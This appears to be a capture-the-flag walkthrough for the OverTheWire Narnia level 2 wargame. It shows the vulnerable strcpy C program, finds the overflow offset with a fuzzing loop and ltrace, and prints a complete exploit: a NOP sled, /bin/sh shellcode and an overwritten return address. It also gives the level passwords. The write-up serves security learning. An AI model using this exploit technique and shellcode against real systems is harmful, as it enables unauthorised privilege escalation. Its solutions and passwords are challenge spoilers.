# Narnia 1 - Narnia 2
    SSH  : ssh narnia2@narnia.labs.overthewire.org -p 2226
    Pass : nairiepecu
# Method For Solution
First we are going to nativate to /narnia/ directory and analyze . there we can see the narnia2 file . when we execute that file we can see
```
narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument
narnia2@narnia:/narnia$ ./narnia2 ABCD
ABCDnarnia2@narnia:/narnia$
```
It required a argument when passwed with an argument it just returns it .

Now let's look at the narnia2.c file : 

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

It looks like a standard buffer overflow challenge. There is no size check in the strcpy() function and the buf variable is only 128 bytes long. So, if we enter more chars than the size of the buffer, we should be able to break the execution flow by overwriting the return address.

    for i in $(seq 1 300); do echo $i; ./narnia2 $(python -c 'print "A"*'$i';'); done

Executing the above shell command . All this does is loops from 1 to 300, and echoes out the number each time, but also prints "A" that amount of times while passing it as an argument to the binary, so we can follow the numbers until we find a segfault.
We got Segmentation fault . 
We can see that after 132 the binary segfaults, so that is our space we have till the ret address starts getting overwritten.

Now, the buffer is 128 bytes, and the ret address breaks at 132, so between the end of the buffer, and the start of the return address there are 4 bytes of "junk", which you can just fill with nopsleds, but in our case we will just repeat the ret address 4 times (one will fall into the right position, the others are fillers).

So we have our padding, to get our return address, we can simply crash it with a segfault, while watching it with ltrace.

```
narnia2@narnia:/narnia$ ltrace ./narnia2 $(python -c 'print "A"*132')
__libc_start_main(0x804844b, 2, 0xffffd704, 0x80484a0 <unfinished ...>
strcpy(0xffffd5e8, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                     = 0xffffd5e8
printf("%s", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                                           = 132
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```

Ltrace shows us that strcpy tries to copy our "A"s to the address 0xffffd5e8 (the memory location of the buffer), which in little endian is: \xe8\xd5\xff\xff. So we have the padding, we have the return address, now we just need the shellcode. For this we can use the example alphanumeric shellcode, or we can find our own with a simple google search for "32 bit bin sh shellcode" .

So now to structure our payload, the idea is to take advantage of the fact that we control the contents of the buffer, and we also control the return address, so if we make the contents of the buffer malicious, and then return back to the start of the buffer, it will be executed.

Now Executing this command the gain the narina3 shell access :

       ./narnia2 $(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\x90\x90\x90" + "\xe8\xd5\xff\xff"')

# Password
     vaequeezee
